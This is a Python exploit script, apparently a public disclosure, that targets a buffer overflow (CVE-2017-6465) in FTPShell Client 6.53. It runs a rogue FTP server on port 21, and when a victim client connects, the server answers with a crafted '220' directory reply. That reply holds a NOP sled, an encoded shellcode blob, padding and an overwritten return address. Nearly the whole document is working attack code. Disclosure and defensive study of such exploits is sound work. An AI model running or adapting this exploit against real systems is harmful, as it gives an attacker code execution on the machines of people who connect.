# Exploit Title: FTPShell Client 6.53 buffer overflow on making initial connection
# Date: 2017-03-04
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Version: Windows Server 2008 R2 x64
# Tested on: Windows Server 2008 R2 Standard x64
# CVE: CVE-2017-6465

# 2017-03-04: Software vendor notified
# 2017-03-06: No reply
# 2017-03-06: Publishing

import socket
import sys

shell=("\xd9\xd0\xd9\x74\x24\xf4\xb8\xce\xb6\x13\x50\x5f\x2b\xc9\xb1"
"\x31\x83\xc7\x04\x31\x47\x14\x03\x47\xda\x54\xe6\xac\x0a\x1a"
"\x09\x4d\xca\x7b\x83\xa8\xfb\xbb\xf7\xb9\xab\x0b\x73\xef\x47"
"\xe7\xd1\x04\xdc\x85\xfd\x2b\x55\x23\xd8\x02\x66\x18\x18\x04"
"\xe4\x63\x4d\xe6\xd5\xab\x80\xe7\x12\xd1\x69\xb5\xcb\x9d\xdc"
"\x2a\x78\xeb\xdc\xc1\x32\xfd\x64\x35\x82\xfc\x45\xe8\x99\xa6"
"\x45\x0a\x4e\xd3\xcf\x14\x93\xde\x86\xaf\x67\x94\x18\x66\xb6"
"\x55\xb6\x47\x77\xa4\xc6\x80\xbf\x57\xbd\xf8\xbc\xea\xc6\x3e"
"\xbf\x30\x42\xa5\x67\xb2\xf4\x01\x96\x17\x62\xc1\x94\xdc\xe0"
"\x8d\xb8\xe3\x25\xa6\xc4\x68\xc8\x69\x4d\x2a\xef\xad\x16\xe8"
"\x8e\xf4\xf2\x5f\xae\xe7\x5d\x3f\x0a\x63\x73\x54\x27\x2e\x19"
"\xab\xb5\x54\x6f\xab\xc5\x56\xdf\xc4\xf4\xdd\xb0\x93\x08\x34"
"\xf5\x6c\x43\x15\x5f\xe5\x0a\xcf\xe2\x68\xad\x25\x20\x95\x2e"
"\xcc\xd8\x62\x2e\xa5\xdd\x2f\xe8\x55\xaf\x20\x9d\x59\x1c\x40"
"\xb4\x39\xc3\xd2\x54\x90\x66\x53\xfe\xec")

port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[i] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")



# 004b95dc in ftpshell.exe PUSH ESI ; RETN
eip = "\xdc\x95\x4b"
nops = "\x90"*8 
junk = "A"*(400-len(nops)-len(shell))
buffer = nops + shell + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to your unfriendly FTP server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
